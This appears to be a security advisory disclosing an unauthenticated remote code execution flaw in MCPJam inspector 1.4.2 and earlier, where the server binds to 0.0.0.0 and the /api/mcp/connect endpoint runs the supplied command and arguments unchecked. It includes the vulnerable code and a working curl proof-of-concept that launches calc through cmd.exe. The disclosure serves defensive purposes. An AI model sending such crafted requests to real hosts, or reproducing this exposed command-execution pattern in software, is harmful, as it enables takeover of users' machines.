  "summary": "REC in MCPJam inspector due to HTTP Endpoint exposes",
  "details": "### Summary\nMCPJam inspector is the local-first development platform for MCP servers. The Latest version Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnerability, which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE.\n\nThis vulnerability is similar to CVE-2025-49596, but more severe. While CVE-2025-49596 requires tricking a user into clicking a malicious link, this vulnerability is exploitable with no user interaction. Since MCPJam inspector by default listens on 0.0.0.0 instead of 127.0.0.1, an attacker can trigger the RCE remotely via a simple HTTP request.\n\n\n\n### Details\nMCPJam inspector binds to `0.0.0.0` making its HTTP APIs remotely reachable.\n``` TypeScript\nconst server = serve({\n  fetch: app.fetch,\n  port: SERVER_PORT,\n  hostname: \"0.0.0.0\",\n});\n```\n\nThe `/api/mcp/connect` API, which is intended for connecting to MCP servers, becomes an open entry point for unauthorized requests. When an HTTP request reaches the `/connect` route, the system extracts the `command` and `args` fields without performing any security checks, leading to the execution of arbitrary command.\n\n### PoC\n(1) Start up the MCPJam inspector as Github README\n`npx @mcpjam/inspector@latest`\n\n(2) RCE by posting a HTTP request\nA remote code execution (RCE) attack can be triggered by sending a simple HTTP request to the target host running MCPJam inspector (e.g., http://10.97.58.83:6274 in the test environment).\n`curl http://10.97.58.83:6274/api/mcp/connect --header \"Content-Type: application/json\" --data \"{\\\"serverConfig\\\":{\\\"command\\\":\\\"cmd.exe\\\",\\\"args\\\":[\\\"/c\\\", \\\"calc\\\"],\\\"env\\\":{}},\\\"serverId\\\":\\\"mytest\\\"}\"`\n\n\n<img width=\"1669\" height=\"1397\" alt=\"image\" src=\"https://github.com/user-attachments/assets/cb6505f1-3cdd-4c64-8f39-a01619a63411\" />\n\n\n### Impact\nRemote Code Execution (RCE)",
